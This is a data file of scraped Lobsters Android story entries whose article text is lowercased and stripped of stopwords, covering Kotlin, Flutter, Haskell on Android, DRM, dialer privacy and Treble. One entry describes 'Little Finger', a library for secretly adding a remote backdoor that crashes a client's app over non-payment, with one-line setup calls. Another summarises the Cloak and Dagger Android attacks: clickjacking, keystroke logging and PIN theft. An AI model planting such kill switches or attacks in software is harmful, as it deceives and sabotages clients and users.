254,Lobsters,android,Android,"Little Finger, a library to add a kill switch to your mobile apps",http://avi.im/little-finger/,little finger library add kill switch mobile apps,little finger anonymous quora answer work http status code default behaviour quick instruction io android detailed instruction little finger server swift repo readme android repo readme demo io android heroku name petyr baelish license mit license,little finger little finger set simple serverclient library let add backdoor androidios app easily single line code project based anonymous quora answer say freelancer often must faced really bad client vanish without paying money promised using little finger crash app remotely client vanishes receive money make app work expected work little finger come server component client library make call server based response http status code received take action money received let work expected never make another call server however money received crash app server also send local push notification app display take one line code start little finger start everytime appdelegate didfinishlaunchingwithoptions swift mainactivityoncreate android http status code following http status code used server sends httppaymentrequired httpok payment expected receive litte finger let app work usual little finger keep calling server everytime started know status payment server sends httpaccepted payment received little finger update app preference future network call made server sends httpconflict payment received conflict little finger receives crash app server also notification data little finger us display local notification crashing creative send notification text saying million dollar spammy message make matter worse default behaviour internet available app fails make http call app crash server sends response app continues work expected heroku app app fails reach app continue work expected heroku sends little finger fully open source free fork modify behaviour per taste quick instruction install server heroku click deploy heroku button bottom give response status code include little finger calling code app io littlefingerstart http yourherokuappherokucomstatus android littlefingerstart http yourherokuappherokucomstatus received payment conflict update heroku app environment variable usually located http dashboardherokucomappsyourherokuappsettings config variable accordingly detailed instruction little finger server written clojure come one click heroku deploy located bottom click server installation swift check swift repo readme detailed installation instruction android check android repo readme detailed installation instruction demo simple crude demo apps io android heroku name name little finger come grrm song ice fire character petyr baelish license library server released mighty mit license please check license file respective repository detail
255,Lobsters,android,Android,A Haskell Cross Compiler for Android,https://medium.com/@zw3rk/a-haskell-cross-compiler-for-android-8e297cb74e8a,haskell cross compiler android,haskell cross compiler android haskell cross compiler raspberry pi cabal cross compilation cross compile template haskell android ndk llvm provides ndk android raspbian cross compilation sdk release download website toolchain wrapping wrapper androidtoolchainconfig prerequisite building iconv android static downloadshaskellorg haskell cross compiler raspberry pi libtoollite building ghc compiling hello world chello hello extern extern void int char extern char void void jnienv jclass jstring jnienv jobject return hello haskell hello haskell,haskell cross compiler androidover last two week saw build haskell cross compiler raspberry pi set cabal cross compilation cross compile template haskell building haskell cross compiler android almost identical minor differencesfor raspbian haskell cross compiler single architecture android run plethora architecture focus arm processor specifically android ndk llvmgoogle provides ndk android provides similar set tool raspbian cross compilation sdk contains android toolchain sysrootfor ghc need opt llc llvm obtained release download websitetoolchain wrappingto keep path tidy abstract android ndk bit use wrapper script wrap toolchain embeds sysroot binbashsource androidtoolchainconfigname cmd name target name case name cabal fcommon builddirdist target fcompile withghc target ghc fcompile withghcpkg target ghcpkg fcompile withgcc target clang fcompile withld target ld fcompile crosscompile fconfig disableshared configureoption host target case configureinstall flag fcommon fcompile fconfig build flag fcommon fcompile listinfoupdate flag flag flag fcommon esac android flag target target flag sysroot flag isysroot flag sysroot flag l android flag target target flag sysroot flag isysroot flag sysroot flag l default nm ar ranlib echo unknown command exit esaccase target exec env path path cmd flag exec env path path cmd flag exec cmd flag esacthe wrapper depends androidtoolchainconfig obtained repository androidtoolchainconfig likely need minor modification encoding location ndknext create symbolic link wrapper script target command clang ld ldgold nm ar ranlib cabal ln wrapper target command donedonethis produce file eg point wrapper wrapper turn build necessary flag pas command based name file note assume ldbfd ldgold accept flagsprerequisitesas android ship iconv default ghc depends iconv need build laid building iconv android note want build target want build static library pas enablesharedno enablestaticyes configure script ease integrating library android studioto build ghc need ghc cabal well alex happy recent ghc version downloadshaskellorg provide ghc cabal alex happy installed via cabal cabal install alex happyas haskell cross compiler raspberry pi need build newer libffi source due incompatibility latest release version libffi recent llvm version wrapped toolchain path building libffi simple git clone http githubcomlibffilibffigitcd libffiautogenshcc cxx configure enablestaticyes enablesharedyesmake make installgit clean f x dautogenshcc cxx configure enablestaticyes enablesharedyesmake make installthis build place libffi header library also using ghcs staticlib flag ghc us libtool staticlib ndk ship libtool need thin wrapper libtoollite repository used instead us ar ranlib hood need create symbolic link pointing ln libtoollite libtoollite ghcwe need build ghc target ghc alex happy cabal path well wrapped toolchain export path homecabalbin pathexport pathpathtobinghc pathexport pathpathtowrappedtoolchain pathand copy patched ghc git clone recursive git githaskellorgghcgitcd ghcgit remote add http fetch checkout b myghcgit submodule update init recursivebuilding ghc require nothing set pathsexport prefixmyprefixexport libffipathtolibffiexport libiconvpathtolibiconvfor target clean build tree git clean x f boot build system boot configure ghc target target configure target target prefix prefix disablelargeaddressspace withiconvincludes libiconv targetinclude withiconvlibraries libiconv targetlib withsystemlibffi withffiincludes libffi targetinclude withffilibraries libffi targetlib create mkbuildmk set buildflavour quickcross sed e buildflavour quickcross mkbuildmksample mkbuildmk compile install ghc make j make installdoneas build two cross compiler take approximately minute depending hardware done installed myprefixbincompiling hello worldfor android need produce hello world library call native code android appthe library libhs contains thin wrapper around hello expose c function char hello module lib whereimport foreignc cstring newcstring export haskell function chello hello foreign export ccall hello chello io cstring tiny wrapper return cstringchello newcstring hello pristine haskell functionhello hello haskell assuming android application life pathtohelloworld create make use ghcs staticlib flag produce static library contains libo well dependency single odir hidir staticlib liconv lcharset lffi odir hidir staticlib liconv lcharset lffi libhsnote theliconv lcharset andlpathtolibffi lffi argument currently necessary ghc pas properly libffi argument needed ghc configured withsystemlibffiwe start fresh new android application including c kotlin support also use java example code kotlin though empty activity named mainactivity c use default toolchain neither support exception rtti neededin cmakeliststxt file need tell cmake new libhsa want link libcadding following two findlibrary statement find libcfindlibrary clib c find libhs pathtohelloworldapphslibs abi outside cmakes root search pathfindlibrary hslib h path projectsourcedir hslibs androidabi nocmakefindrootpath including found library final targetlinklibrary statementtargetlinklibraries specifies target library nativelib link target library log library included ndk loglib clib hslib instruct cmake link nativelib contains jni bridge link libhs well libcsetting abifilters appbuildgradle file toandroid defaultconfig ndk abifilters tell android studio native library adjusting nativelibcpp read include jnih include string ifdef cplusplusextern c endifextern void hsinit int argc char argv extern char hello void jniexport jnienv env jclass klass hsinit null null jniexport jnienv env jobject return env newstringutf hello ifdef cplusplus endifwill provide hello prototype use stringfromjni method call hello function also hsinit prototype one initialize haskell runtime called prior calling haskell functionthe mainactivity class mainactivitykt look like external fun iniths class mainactivity appcompatactivity override fun oncreate savedinstancestate bundle superoncreate savedinstancestate setcontentview rlayoutactivitymain example call native method iniths val tv findviewbyid ridsampletext textview tvtext stringfromjni native method implemented nativelib native library packaged application external fun stringfromjni string companion object used load nativelib library application startup init systemloadlibrary nativelib iniths note pointed ugergoerdi rhaskell oncreate called multiple time example code updated move iniths oncreate right loadlibrarythis source needed hello world haskell android app source found running android devicehello haskellfinally launching running application device greeted hello haskellwhile utility application certainly questionable illustrates essential step required build link run android application calling native haskell functionwith well equipped build ghcslave application android next able also cross compile template haskell android
256,Lobsters,android,Android,Exploring Flutter for Cross-platform Mobile Development,https://sethlopez.me/article/exploring-flutter-for-cross-platform-mobile-development/,exploring flutter crossplatform mobile development,flutter easy setup installation instruction intellij idea dart dart rendering performance skia flux hot reload livereload getting started guide verdict send tweet,work weekly meeting mobile developer presentation given different developer week turn came around recently decided spend time researching flutter crossplatform framework google android developer always interested crossplatform framework potential benefit could provide often hear good thing coworkers others android development community explored flutter found framework surprisingly good albeit early development clear flutter tech preview phase hit alpha may day ago time writing important understand flutter still long way go way library general improvement framework said flutter alpha sure flutter developer want people try framework report bug come across suggestion easy setup setting development environment flutter incredibly straightforward installation instruction easy follow flutter cli includes doctor command check system flutter dependency tell exactly need install missing dependency intellij idea seems primary editor flutter apps flutter team maintains plugin experience flutter development intellij good plugin worked flawlessly providing autocompletion code formatting giving easy way run flutter apps io android emulator physical device dart actually using flutter take little detour learn dart programming language flutter apps written dart get aheadoftime aot compiled machine code meaning interpreter involved app run device initially really sure think dart language seems like combination java javascript ecmascript make sense google originally pushing web language would eventually support chrome dart lot feature would see well optional typing abstract class interface generic isolates similar green thread spending little bit time writing dart code found pretty easy language use expressive faster write understand java stay way rendering performance one interesting facet flutter use builtin ui widget either mobile platform instead flutter us graphic library called skia serf rendering engine draw flutter ui widget directly screen bypassing native ui rendering ui using special sauce layout painting compositing step flutter apps able achieve consistent frame per second found video pretty informative flutter able achieve performance goal video though flutter use native ui widget crossplatform framework widget android io could tell flutter google invention seemed material android widget io widget look like actively developing new cupertino widget tried couple flutter apps platform mostly great android found performance better apps built native android framework dropped frame anywhere sure see io biggest thing stuck scrolling quite feel right physic sure would require little tweaking flutter team two talk flutter google io day ago talk show easy make app platform video flutter everything widget composable way understand concept widget primarily couple thing create piece ui like screen button paragraph text wrap another widget modify look work applying style like color font etc creating padding margin layout defining input gesture recognition two main type widget statelesswidget statefulwidget statelesswidget sound state defines build method describes widget appears class redsquare extends statelesswidget final widget child redsquare key key thischild super key key override widget build buildcontext context return new container decoration new boxdecoration color new color shape boxshaperectangle child child statefulwidget hand keep track state separate class extends state class state class actually contains build method statefulwidget basically describing state appear class fizzbuzzscreen extends statefulwidget fizzbuzzscreen key key super key key override fizzbuzzscreenstate createstate new fizzbuzzscreenstate class fizzbuzzscreenstate extends state fizzbuzzscreen int counter void incrementcounter setstate counter string getfizzbuzz string fizzbuzz counter fizzbuzz fizz counter fizzbuzz buzz return fizzbuzzlength countertostring fizzbuzz override widget build buildcontext context return new scaffold body new center child new text counter getfizzbuzz floatingactionbutton new floatingactionbutton onpressed incrementcounter child new icon iconsadd example screen display text fizzbuzz counter using interpolated string call getfizzbuzz method determine text show floating action button fab call incrementcounter method pressed key getting widget screen case update user found incrementcounter method inside method call setstate defined state class pas anonymous function setstate mutate state needed within function setstate take care rebuilding widget display update user familiar concept flux might recognize somewhat similar oneway data flow ui reacts change state found refreshing flutter chose enforces sort pattern hot reload long build time something mobile developer experience daily basis one great thing flutter inclusion hot reload hot reload allows update source app fly without restart experience hot reload simple app screen incredibly fast time clicking hot reload button intellij seeing ui update emulator half second according flutter log eye experience similar get common tool frontend developer use called livereload even better hot reload clear state widget change piece ui use hot reload information widget previously still start home screen app every time update ui image getting started guide verdict surprised find solid framework flutter overall flutter look like promising crossplatform framework excited see go absolutely keeping future development framework might even start contributing library definitely encourage try flutter used flutter think send tweet
257,Lobsters,android,Android,Cloak and Dagger: From Two Permissions to Complete Control of the UI Feedback Loop,http://cloak-and-dagger.org/,cloak dagger two permission complete control ui feedback loop,tl dr main takeaway list attack version android affected google dashboard,cloak dagger new class potential attack affecting android device attack allow malicious app completely control ui feedback loop take device without giving user chance notice malicious activity attack require two permission case app installed play store user need explicitly grant even notified user study indicates attack practical attack affect recent version android including latest version android yet fixed tl dr main takeaway uncover series vulnerability design shortcoming affecting android ui attack abuse one systemalertwindow draw top bindaccessibilityservice malicious app installed play store user notified permission need explicitly grant attack succeed fact scenario draw top automatically granted permission enough lure user unknowingly enable clickjacking possible attack include advanced clickjacking unconstrained keystroke recording stealthy phishing silent installation godmode app permission enabled silent phone unlocking arbitrary action keeping screen see full list attack practical performed user study human subject user understood happened attack due design issue thus challenging prevent fact one may say functionality work intended nonetheless work show functionality abused date attack still practical see version android affected responsible disclosure list attack attack abuse permission contextaware clickjacking context hiding two technique make luring user enable accessibility service practical even latest security mechanism eg obscured flag correctly implemented enabled note others identified way use clickjacking get see faq invisible grid attack allowing unconstrained keystroke recording including password private message etc attack abuse permission unconstrained keystroke recording including password according documentation possible see security note security pin stealing device unlock pin injection perform arbitrary action keeping screen stealing twofactor authentication token smsbased google authenticator appbased token ad hijacking web exploration attack abuse permission silent installation godmode app permission enabled stealthy phishing user find logged would expect version android affected current status june previous version likely vulnerable well attack android android android invisible grid attackvulnerablevulnerablevulnerable clickjacking silent godmodevulnerablevulnerablevulnerable stealthy phishingvulnerablevulnerablevulnerable pin stealingvulnerablevulnerablevulnerable phone unlocking screen vulnerablevulnerablevulnerable leaky password token cc vulnerablevulnerablevulnerable relative number device running given version android number taken google dashboard clustered android main version eg android google implemented partial fix android top overlay appear anymore whenever app permission list shown however used normal permission special permission draw top problematic since clickjacking still possible malicious app use phone unlocking keeping screen attack enable permission keeping screen thus making silent installation godmode app still practical suggest google extend protection mechanism entire setting app least special permission well although google marked bug report wo nt fix noticed google keyboard actually received update first glance seems avoid leaking password fact typing password accessibility event generated keyboard app contains dot instead actual character however found workaround attack accessibility event access hashcode node generating event since possible enumerate widget hashcodes designed pseudounique hashcodes enough determine keyboard button actually clicked user
258,Lobsters,android,Android,Haskell on Android using Eta,https://brianmckenna.org/blog/eta_android,haskell android using eta,eta presentation eta foreign function interface nt yet support uber jar mode code without main module around device hitting google play android studio part code,eta fork ghc provides haskell jvm backend working recently presentation lambdajam one question presentation since eta take haskell produce jvm code use write android apps feeling eta close able turn close pretty easy let write code us android api language datakinds language magichash language typefamilies language typeoperators language flexiblecontexts language overloadedstrings module xyzprofunctorandroid import java import javastringutils data class androidcontentcontext context context object context deriving class data class androidappactivity activity activity object activity deriving class type instance inherits activity context data class androidviewview view view object view deriving class data class androidwidgettextview textview textview object textview deriving class type instance inherits textview view foreign import java unsafe new newtextview c context c java textview foreign import java unsafe setcontentview setcontentview v view v java activity foreign import java unsafe settext settext c charsequence c java textview data class xyzprofunctorandroidactivityimpl activityimpl activityimpl object activityimpl foreign export java static startactivity startactivity activity java activityimpl startactivity activity java startactivity activity textview newtextview activity textview settext foldr sconcat world replicate eta activity setcontentview textview show power eta foreign function interface able describe android java interface data type representing class type family representing subtyping foreign import representing method code us normal prelude code eg foldr replicate demonstrate full haskell file compiled eta androidhs get androidjar file using android studio create new project copy jar applibs directory also need dependency code ideally able use eta build tool etlas bundle dependency jar via etlas configure enableuberjarmode sadly nt yet support uber jar mode code without main module let work around problem dodgy shell copy dependency file library ghcprim base rts integer dir etapkg field library librarydirs simpleoutput jar etapkg field library hslibraries simpleoutput jar cp dir jar applibs done edit project java code use exported haskell method package xyzprofunctoretaandroid import import androidosbundle import xyzprofunctorandroidactivityimpl public class mainactivity extends appcompatactivity override protected void oncreate bundle savedinstancestate superoncreate savedinstancestate activityimplstartactivity debug build try create apk fail enormous number method work around enable multidex supported since android api level ie least android lollipop around device hitting google play getting proguard run debug build work instead nt bother enabling multidex easy need merge following setting generated appbuildgradle android defaultconfig multidexenabled true buildtypes release minifyenabled true lintoptions disable invalidpackage add proguard rule appproguardrulespro dontwarn base dontwarn eta dontwarn ghcprim dontwarn integer dontwarn main without proguard get apk file proguard around pressing button android studio start app emulator compile using gradle gradle assembledebug debug build gradle assemblerelease release build gradle build thing look like android studio emulator screenshot physical android device chucked code android studio part code need applibs directory made
259,Lobsters,android,Android,New Netflix DRM Blocks Rooted Phone Owners From Downloading The Netflix App,https://www.techdirt.com/articles/20170516/06083537378/new-netflix-drm-blocks-rooted-phone-owners-downloading-netflix-app.shtml,new netflix drm block rooted phone owner downloading netflix app,new netflix drm block rooted phone owner downloading netflix app dept recently introducing downloadable show confirmed updated drm plan android police need support android copyright drm piracy rooted widevine google netflix,new netflix drm block rooted phone owner downloading netflix app drivinguserstopiracy dept site long documented drm often provides false sense security terrified piracy yet frequently annoys paying customer ironically driving customer piracy alternative drm supposed prevent first place latest example phenomenon latest version netflix app netflix leaning entirely google widevine digital right management system netflix recently introducing downloadable show assuming license specific program allows netflix programming partner likely wanted netflix utilize widevine ensure netflix app work device certified google meet android requirement problem countless enthusiast enjoy rooting device installing custom rom nt pirate netflix content yet user look netflix app google play store greeted warning message telling device legally longer compatible netflix app netflix confirmed updated drm plan android police acknlowledging app downloadable rooted phone app may longer even show play store latest release fully rely widevine drm provided google therefore many device googlecertified altered longer work latest app user longer see netflix app play store thinking part netflix broadcaster rooted phone custom rom greater control o therefore better chance able bypass drm many folk simply modify device enjoy greater flexibility provides necessarily looking pirate content user faced choice either giving additional control device watch netflix heading piracy alternative want watch netflix program app listing google play store appears determined whether device cleared run android pay widevine mean simply got bootloader unlocked nt even fully rooted phone installed custom rom still denied access netflix even still using secure stock implementation android result many user left review app warning netflix decision punish modifying device may simply drive piracy clear nt exactly apocalypse method allow hide fact device rooted many user say still able sideload netflix app device fact remains customer nt technically anything wrong punished anyway likely largely false sense security given content company believe secured going wind bittorrent network anyway real net result annoyed paying possibly former customer thank reading techdirt post many thing competing everyone attention day really appreciate giving u time work hard every day put quality content community techdirt one remaining truly independent medium outlet giant corporation behind u rely heavily community support u age advertiser increasingly uninterested sponsoring small independent site especially site like unwilling pull punch reporting analysis website resorted paywalls registration requirement increasingly annoyingintrusive advertising always kept techdirt open available anyone order continue need support offer variety way reader support u direct donation special subscription cool merchandise every little bit help thank techdirt team filed android copyright drm piracy rooted widevinecompanies google netflix
260,Lobsters,android,Android,"Android developers can now block rooted devices, Netflix bites",http://www.osnews.com/story/29821/Android_developers_can_now_block_rooted_devices_Netflix_bites,android developer block rooted device netflix bite,discovered confirmed developer able block application installed rooted android device,weekend discovered android netflix application could longer installed rooted android device fact vanished play store rooted device completely netflix confirmed started blocking rooted device installing netflix application well turn going downhill google explained io developer able block application installed rooted android device developer able choose state shown top image excluding device based safetynet excluding pas integrity excluding latter plus certified google mean dev could potentially block apps showing directly installable play store device rooted andor running custom rom well emulator uncertified device think meizu notsolegal way getting play service play store phone exactly many afraid would happen play store app started surfacing device certification status bad news custom rom community longer install netflix possibly application custom rom way using custom rom device play function still sideload application question google play service installed virtually every android device one wonder worry long check happen ondevice instead inplay
261,Lobsters,android,Android,Why Kotlin Is Better Than Whatever Dumb Language You're Using,http://steve-yegge.blogspot.com/2017/05/why-kotlin-is-better-than-whatever-dumb.html,kotlin better whatever dumb language using,,ah clickbait would internet without answer shock seriously nt mean insult favorite much language choice probably getting better glacial pace right language nt dead gradually getting better release update slowly though well language using happens java doubt realized time java becomes really good language dead loooong dead know nt like contemplate mortality plot trajectory java birth year ago full knee hip replacement java ca nt help wonder going stuck literally rest life good get anyhoo ran across old language question finally tried hand android development io client old game wyvern decided somewhat recently take plunge write android version nt realize would turn language question hell life done android programming know fact burning question androidland first attempt android last summer god sucked mean warned everyone warned apis terrible said ca nt say nt warned terrible could though java right legacy yuck unfortunately long complicated legacy reason nobody care android core apis really bad mean baaaaad bad shut book take deep breath go coffee bad warning spot mixed bag though lot apis ducky found plenty thing hard io easy android product flavor downloads service findviewbyid preference activity etc ton stuff android equivalent io io wind writing gross hacky code building elaborate library work around big learning writing android everyone focus bad apis reason traffic focus red light green light tend judge commute many red light android pretty big redlight apis fragment example wellknown flagship bad api android fact entire lifecycle maddeningly awful activity fragment io living proof nt bad defending bad tried first time last summer gave threw towel screw said hire someone port someday nt look android programming another half year rescued russian kept hearing newish programming language jvm android called kotlin russia place specifically jetbrains maker worldfamous intellij idea ide whose primary claim fame lovely orange green purple black darcula theme figure thousandyearold vampire expressing excitement java called kotlin well clear play incrementing j java beyond one assume kremlin khrushchev kgb already taken probably uc berkeley next best thing named russian military base bad name though get used last year noticed kotlin fair amount buzz hype buzz people lowkey buzzing sure whatever took look like done fifty hundred language past year quest replace java anything reasonable kotlin first impression first looked kotlin honestly nt think chance use real life even remotest possibility window shopping first glance nothing immediately wrong clean modern anything felt almost hipsterish adoption latest new trend language design oodles language like look rust another solid appropriatelynamed language almost nobody us good language nt really matter adoption standpoint kotlin came across strangely familiar though eventually realized look like swift slow notice io app objective c irritating legacy reason course know backwards kotlin predates swift several year accurate say swift like kotlin none made want sit use kotlin another decentlooking language working stiff nt really feel like putting effort learn well enough anything real kotlin experiment java expatriate nt remember exactly fell love kotlin tell sure hell nt expecting best remember player begging android version game launched apple app store december within week ton old fan emerged tell could nt play unless android despite swearing android forever decided better give one try something change nt going able stomach vanilla android java programming language experience needed framework whatever ease pain midjanuary quickanddirty evaluation decided try kotlin also target android dalvik art runtimes think evaluation equal part kotlin buzz b wishing written io app swift c kotlin sort clever android dsl called anko never wound using initially piqued interest took test drive within maybe four five week like rewriting game server platform kotlin one month using kotlin sold mean knocking scala language ordinary working clod like kotlin perfect want street food know scala nice fancy frog leg calf brain truffled snail bluecollar use clojure scala guy took maybe day learn kotlin well enough start busting code fully aware nt know hell knowing language ide great job keeping trouble anyway bit fluent well wow jaded nt think possible love language ever kotlin gorgeous everything write feel like made something cool certainly felt way language really steep learning curve kotlin butter tailormade u java programmer still sort scratching head java parallel streaming filterable collecting scheduled completable callbacking futuring listening forking executor noun kingdom kotlin give power substantially actually coroutines support make way easier say stuff java let say interesting thing mouthful sand think fair share kotlin easy pick though owes ide support ide support pretty much every jvm android language besides java tends bolted couple community volunteer whereas kotlin made worldclass ide vendor right start best tooling support ever many language name built ide support ground language nt usually evolve like fact many language designer outright eschew ides hi rob one think offhand c c easily one best language earth handsdown upshot idefirst language type pretty much anything even approximately correct kotlin buffer ide gently tell meant type heck even paste java code convert automatically like java ide support well pleased report kotlin pushed experience unprecedented level even exmicrosoft engineer tell used think visual studio unbeatable flagship ide intellij actually better mean nt know visual studio relating say betting idea least par v course always need switch emacs get real work done intellij nt like type fast completion ca nt keep wind halfidentifiers everywhere awful raw text manipulation every ide need use emacs kotlin support unfortunately soso right presumably improve time constantly switch back forth emacs intellij getting good enough spent decade searching language replace java mean looked hard ironically gave finally came along go figure kudos jetbrains amazing achievement android kotlin killer app nighimpossible new language get traction day say new language neat new one almost every year nobody ever ever use hard bordering impossible language market fully saturated way new language make big splash think true least ten maybe twenty year killer app need platform everyone want use badly willing put learning new language order program platform turn perfect killer app brings u full circle android crappy red light apis zooming along road androidland every time hit api stop track curse platform nt actually matter many good apis android long sufficiently many bad one make pause look around big solution boyo big solution ever abound android starter bunch java annotation processor sure sign language problem afoot bunch miniframeworks like say lyft scoop even fullon departure android react native cordova xamarin flutter make mistake people looking alternative big gap like opportunity languagebased solution unsurprisingly fullon departure based around specific language nt java kotlin competitive advantage though fullon departure completely interoperable even interminglable java almost though quite extent c c kotlin feel like evolutionary step start mixing right existing android project right directory call back forth without batting eyelash big android platform contender force learn use completely different language platform paradigm idiom quirk kotlin let program android like regular old workingclass android programmer apis somehow better feel order magnitude better first line throw android book wall give last summer kotlin finding android programming dare say enjoyable think suggests android bad apis nt bad begin rather java masking android neat functionality bunch javay cruft kotlin manages help route around android red light turn experience something whole find superior io development well least objectivec sure swift awesome like kotlin specifically like kotlin well specific another large writeup separate post mention highlevel generality work like java weird like clojure scala let face pretty weird learn quickly obviously designed accessible java developer safer java provides builtin support many thing handled java day annotation processor override checking nullability analysis etc also safer numeric conversion rule although sure like appreciate force think number representation interoperable java mean interop flawless seen many jvm language go flame could nt subclass dunno static inner class nonstatic inner class whatever weirdass edge case needed time kotlin made java interop top priority mean migration kotlin done incrementally one file time succinct bit golfer honest else equal like shorter program thing clear enough kotlin make great round golf average find shorter equivalent jython code sort gold standard remaining readable far typesafe practical kotlin allows multiple class per file toplevel function operator overloading extension method type aliasing string templating whole bunch bogstandard language feature whatever reason java never adopted even though everyone wanted evolving fast instance launched coroutine support going provide foundation asyncawait generator favorite nonthreaded concurrency feature unashamed kotlin often borrows great idea language nt try hide say liked c generic way like got dsl dsl ever created without serious consideration alternative dsl done well powerful tool look gradle dsl instance comparison thousand line xml typical maven project kotlin make kind thing easy got one hell ide lately taken writing new file emacs let bust ton code quickly code happens full horrible error open intellij hit altenter like time ide fix everything great symbiosis fun kotlin plain fun maybe subliminal advertising since keyword declaring method fun somehow turned surly professional programmer hobbyist anyhoo get idea packed moving new neighborhood called kotlin raved language plenty time never ever rewrite precious java game server code busily rewriting everything kotlin fast know programmer also fullon converted kotlin beat least year two buzz sometimes kotlin make programming fun tell funny thing nt fully grasped programming become nonfun tried kotlin take back first learning programming everything seemed achievable big kudos jetbrains done amazing job language hatsoff impressed kotlin better whatever dumb language using think certainly language using happens java daily routine involves coding java think find kotlin unexpected breath fresh air let know think disclaimer personal opinion based personal android development endorsed way employer jetbrains
262,Lobsters,android,Android,Kotlin on Android. Now official,https://blog.jetbrains.com/kotlin/2017/05/kotlin-on-android-now-official/,kotlin android official,kotlin talk schedule kotlinconf big thank frequently asked question faq web site kotlin going become primarily focused android impact kotlin release cycle going work android studio plugin affect support intellij idea eclipse netbeans affect support macos io jetbrains going acquired google,today google io keynote android team announced firstclass support kotlin believe great step kotlin fantastic news android developer well rest community thrilled opportunity open android developer kotlin support chance use modern powerful language helping solve common headache runtime exception source code verbosity kotlin easy get started gradually introduced existing project mean existing skill technology investment preserved starting android studio ship kotlin box meaning android developer longer need install extra worry compatibility also mean moving forward rest assured jetbrains google supporting android development kotlin case concerned platform kotlin support kotlinjvm server desktop kotlinjs kotlinnative please sure important u ever vision make kotlin uniform tool endtoend development various application bridging multiple platform language includes fullstack web application android io client embeddediot much programming language like human one people speak language better firstclass support android likely bring user kotlin expect community grow significantly mean library tool developed infor kotlin experience shared kotlin job offering learning material published excited see kotlin ecosystem flourish partnering google create nonprofit foundation kotlin language development continue sponsored jetbrains kotlin team people second largest team company operate usual andrey breslav remains lead language designer kotlin developed principle keep design process open feedback critical u moving kotlin right direction google io make sure stop one kotlin talk schedule course forget register kotlinconf san francisco november amazing event big thank started journey kotlin year ago aimed creating language would line principle drive tool create something help developer tedious mundane task allowing focus truly important course make process enjoyable fun possible want thank google android team trust kotlin want thank community user without kotlin today thank accompanying u journey hope join u exciting road ahead frequently asked question prepared answer series question may regard announcement question covered please feel free ask u comment new kotlin make sure check faq web site learn basic kotlin going become primarily focused android one kotlin goal language available multiple platform always case keep supporting actively developing kotlinjvm serverside desktop type application kotlinjs working kotlinnative platform macos io iotembedded system impact kotlin release cycle kotlin continue independent release cycle android android studio project remain completely independent obviously close collaboration product team make sure kotlin always working correctly android studio going work android studio plugin jetbrains continue work android studio plugin collaborating closely android studio team affect support intellij idea eclipse netbeans kotlin continues language target multiple platform support ide continue provided obviously emphasis placed intellij idea hopefully community contribution one affect support macos io still plan support system kotlinnative nothing changed regard jetbrains going acquired google jetbrains plan acquired company jetbrains continues independent tool vendor catering developer regardless platform language choice maxim shafirov
263,Lobsters,android,Android,Android Dialers are Stealing Your Data,https://gkbrk.com/2017/05/android-dialer-packets/,android dialers stealing data,phone update replaces default telephone app phone truecaller turkish drupe first test subject asus dialer truecaller sad state privacy dialer,android functionality phone provided apps includes making phone call well android let replace dialer app phone custom one amazing horrifying time amazing allows programmer create interesting way call people also allows creator malicious apps secretly send private data server techsavvy people big issue trust phone manufacturer open source apps golden thing always simple people familiar best privacy practice see apps app store top thing get hand phone update replaces default telephone app phone truecaller wanted see bad situation eye equipped packet sniffer started installing apps phone know know safest thing choice limited computer slow emulate anything complicated atari article also available turkish drupe first test subject first install app greets permission request contact list refuse start without granted permission suspicious app use calling people app advertises phone ton valid reason needing access contact unfortunately first thing app getting permission serializing contact big string sending server partial local url width asus dialer asus dialer app come preinstalled asus phone test send anything contact list server also communication observed calling number consistent opening paragraph telephone app phone manufacturer steal data carelessly unnecessary risk api call endpoint called made every call api call included email address token number calling assume copy contact list also sent unable take screenshot partial local url width truecaller truecaller telephone app another blogger suspicious also guilty regard sends call startend time data outgoing call number dialed event analytics server top keep track call report server start end along number called client id extensive collection information enough gather talk people talk since apps installed lot people name contact list even install apps still tracked degree sad state privacy apps tested top result search dialer given choice branding massive install number popular dialer apps one approved disregard privacy like even imagine kind intrusion shady apps thanks reading blog post subscribe r feed second good privacy year hope
264,Lobsters,android,Android,Replicant 6.0 released,https://blog.replicant.us/2017/05/replicant-6-0-released/,replicant released,forum post changelog galaxy galaxy galaxy note galaxy status page previous blog post donating replicant task,last one half year lot work done move replicant new version add new feature everything started archived forum post january documented initial effort get replicant somehow working galaxy development continued first half however far work done september onwards replicant last release based cyanogenmod android respectively replicant based lineageos based android replicant includes improvement made since cyanogenmod look changelog overview new feature change additionally made side initial release support galaxy galaxy galaxy note galaxy added incomplete device support telephony mobile data missing status page show functionality supported individual device previous blog post detail reason sdk provided part release unfortunately release support subset device previously supported replicant adding support device highest priority next update thanks device donation community possible get replicant working galaxy nexus galaxy tab galaxy tab galaxy note please consider donating replicant help development additional release goal complete wiki overhaul completed last two month besides updating outdated page general cleanup lot new documentation available user developer alike hope new release attract developer tackle task facing long time
265,Lobsters,android,Android,Treble: A modular base for Android,https://android-developers.googleblog.com/2017/05/here-comes-treble-modular-base-for.html,treble modular base android,life android release vendor interface compatibility definition document benefit project treble developer preview sourceandroidcom,posted iliyan malchev project treble team lead android team view dessert release opportunity make android better user ecosystem partner one thing consistently heard devicemaker partner updating existing device new version android incredibly time consuming costly android working closely device maker silicon manufacturer take step toward solving problem excited give sneak peek project treble biggest change lowlevel system architecture android date life android release first helpful understand life android release several step new android release go getting hand user android team publishes opensource code latest release world silicon manufacturer company make chip power android device modify new release specific hardware silicon manufacturer pas modified new release device maker company design manufacture android device device maker modify new release needed device device maker work carrier test certify new release device maker carrier make new release available user project treble rearchitecting android make easier faster le costly manufacturer update device new version android vendor interface android unveiled free opensource mobile operating system beginning intended android scaled across variety manufacturer knew consistency api important developer created compatibility program developer api specified compatibility definition document cdd associated compatibility test suite ct comprising million test result today app developer write single app work across billion device running different hardware different manufacturer project treble aim ct apps android o framework core concept separate vendor implementation devicespecific lowerlevel software written large part silicon manufacturer android o framework achieved introduction new vendor interface android o framework vendor implementation new vendor interface validated vendor test suite vt analogous ct ensure forward compatibility vendor implementation benefit project treble today formal vendor interface lot code across android need updated device move newer version android stable vendor interface providing access hardwarespecific part android device maker choose deliver new android release consumer updating android o framework without additional work required silicon manufacturer project treble coming new device launched android beyond fact new project treble architecture already running developer preview pixel phone addition architectural change working silicon device partner take code change feature carrier network specific country move common android open source project aosp codebase example sony qualcomm contributed dozen feature hundred bugfixes android longer need rework patch new release android plan publish full documentation project treble sourceandroidcom launch later summer
